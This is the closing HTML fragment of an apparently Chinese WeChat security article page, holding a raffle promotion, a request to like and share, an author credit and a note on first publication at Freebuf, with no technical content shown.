&quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;white-space: normal;background-color: rgb(255, 255, 255);text-align: center;color: rgb(163, 163, 163) !important;"><span style="font-size:15px;line-height:35px;;color: rgb(255, 104, 39);">本月报名可以参加抽奖送暗夜精灵6Pro笔记本电脑的优惠活动</span><br  /></p><p data-darkmode-bgcolor-15976329806349="rgb(25, 25, 25)" data-darkmode-original-bgcolor-15976329806349="rgb(255, 255, 255)" data-style="font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif; letter-spacing: 0.544px; white-space: normal; background-color: rgb(255, 255, 255);" class="js_darkmode__3" data-darkmode-bgcolor-16121018536955="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16121018536955="#fff|rgb(255, 255, 255)" data-darkmode-color-16121018536955="rgb(163, 163, 163)" data-darkmode-original-color-16121018536955="#fff|rgb(163, 163, 163)" data-darkmode-bgcolor-16198392309037="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16198392309037="#fff|rgb(255, 255, 255)" style="font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;white-space: normal;background-color: rgb(255, 255, 255);text-align: center;color: rgb(163, 163, 163) !important;"><br  /></p><p style="font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;white-space: normal;background-color: rgb(255, 255, 255);text-align: center;"><a target="_blank" href="http://mp.weixin.qq.com/s?__biz=MzI5MDU1NDk2MA==&amp;mid=2247496998&amp;idx=1&amp;sn=da047300e19463fc88fcd3e76fda4203&amp;chksm=ec1ca019db6b290f06c736843c2713464a65e6b6dbeac9699abf0b0a34d5ef442de4654d8308&amp;scene=21#wechat_redirect" textvalue="你已选中了添加链接的内容" data-itemshowtype="0" tab="innerlink" data-linktype="1" hasload="1" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);cursor: pointer;"><span class="js_jump_icon h5_image_link" data-positionback="static" style="line-height: 0;inset: auto;"><img class="rich_pages" data-galleryid="" data-ratio="0.4269788182831661" data-s="300,640" src="图片/HACK学习呀_2021-06-26_内网渗透Kerberos协议相关安全问题分析与利用/35_ZtzN9KGsEWibPgYw55Lkm5VuKthibQ.jpg" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_jpg/Uq8Qfeuvouibfico2qhUHkxIvX2u13s7zzLMaFdWAhC1MTl3xzjjPth3bLibSZtzN9KGsEWibPgYw55Lkm5VuKthibQ/640?wx_fmt=jpeg'" data-type="jpeg" data-w="897" style="border-width: 0px;border-style: initial;border-color: initial;border-radius: 36px;inset: auto;box-sizing: border-box !important;visibility: visible !important;width: 677px !important;"></span></a></p><p data-darkmode-bgcolor-15976329806349="rgb(25, 25, 25)" data-darkmode-original-bgcolor-15976329806349="rgb(255, 255, 255)" data-style="font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif; letter-spacing: 0.544px; white-space: normal; background-color: rgb(255, 255, 255);" class="js_darkmode__5" data-darkmode-bgcolor-16121018536955="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16121018536955="#fff|rgb(255, 255, 255)" data-darkmode-color-16121018536955="rgb(163, 163, 163)" data-darkmode-original-color-16121018536955="#fff|rgb(163, 163, 163)" data-darkmode-bgcolor-16198392309037="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16198392309037="#fff|rgb(255, 255, 255)" style="font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;white-space: normal;background-color: rgb(255, 255, 255);color: rgb(163, 163, 163) !important;"><br data-darkmode-bgcolor-16198392309037="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16198392309037="#fff|rgb(255, 255, 255)"  /></p><p data-darkmode-bgcolor-16121018536955="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16121018536955="#fff|rgb(255, 255, 255)" data-style="font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif; letter-spacing: 0.544px; white-space: normal; background-color: rgb(255, 255, 255); text-align: center;" class="js_darkmode__6" data-darkmode-bgcolor-16198392309037="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16198392309037="#fff|rgb(255, 255, 255)" style="font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;white-space: normal;background-color: rgb(255, 255, 255);text-align: center;color: rgb(163, 163, 163) !important;"><span data-darkmode-bgcolor-16198392309037="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16198392309037="#fff|rgb(255, 255, 255)" data-darkmode-color-16198392309037="rgb(255, 104, 39)" data-darkmode-original-color-16198392309037="#fff|rgb(255, 104, 39)" style="font-size:18px;line-height:38px;;color: rgb(255, 104, 39);"><strong data-darkmode-bgcolor-16198392309037="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16198392309037="#fff|rgb(255, 255, 255)" data-darkmode-color-16198392309037="rgb(255, 104, 39)" data-darkmode-original-color-16198392309037="#fff|rgb(255, 104, 39)">点赞，转发，在看</strong></span></p><p data-darkmode-bgcolor-15976329806349="rgb(25, 25, 25)" data-darkmode-original-bgcolor-15976329806349="rgb(255, 255, 255)" data-style="font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif; letter-spacing: 0.544px; white-space: normal; background-color: rgb(255, 255, 255); text-align: right;" data-darkmode-bgcolor-16198392309037="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16198392309037="#fff|rgb(255, 255, 255)" class="js_darkmode__7" style="font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;white-space: normal;background-color: rgb(255, 255, 255);text-align: right;color: rgb(163, 163, 163) !important;"><br data-darkmode-bgcolor-16198392309037="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16198392309037="#fff|rgb(255, 255, 255)"  /></p><p data-darkmode-bgcolor-15976329806349="rgb(25, 25, 25)" data-darkmode-original-bgcolor-15976329806349="rgb(255, 255, 255)" data-style="font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif; letter-spacing: 0.544px; white-space: normal; background-color: rgb(255, 255, 255); text-align: right;" data-darkmode-bgcolor-16198392309037="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16198392309037="#fff|rgb(255, 255, 255)" class="js_darkmode__8" style="font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;white-space: normal;background-color: rgb(255, 255, 255);text-align: right;color: rgb(163, 163, 163) !important;"><span data-darkmode-bgcolor-16198392309037="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16198392309037="#fff|rgb(255, 255, 255)" style="font-size:12px;line-height:32px;;">原创投稿作者：WHOAMI</span></p><p data-darkmode-bgcolor-15976329806349="rgb(25, 25, 25)" data-darkmode-original-bgcolor-15976329806349="rgb(255, 255, 255)" data-style="font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif; letter-spacing: 0.544px; white-space: normal; background-color: rgb(255, 255, 255); text-align: right;" data-darkmode-bgcolor-16198392309037="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16198392309037="#fff|rgb(255, 255, 255)" class="js_darkmode__8" style="font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;white-space: normal;background-color: rgb(255, 255, 255);text-align: right;color: rgb(163, 163, 163) !important;"><span style="font-size:12px;line-height:32px;;">文章首发在Freebuf</span></p><p style="font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;white-space: normal;background-color: rgb(255, 255, 255);text-align: center;"><img class="rich_pages __bg_gif" data-galleryid="" data-ratio="0.5197505197505198" src="图片/HACK学习呀_2021-06-26_内网渗透Kerberos协议相关安全问题分析与利用/36_EedaMZeibI6cKE55jiaLMf9APuY0pA.gif" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_gif/Uq8QfeuvouibQiaEkicNSzLStibHWxDSDpKeBqxDe6QMdr7M5ld84NFX0Q5HoNEedaMZeibI6cKE55jiaLMf9APuY0pA/640?wx_fmt=gif'" data-type="gif" data-w="962" style="box-sizing: border-box !important;visibility: visible !important;width: 677px !important;"></p>
                </div>
</div>
</body>
</html>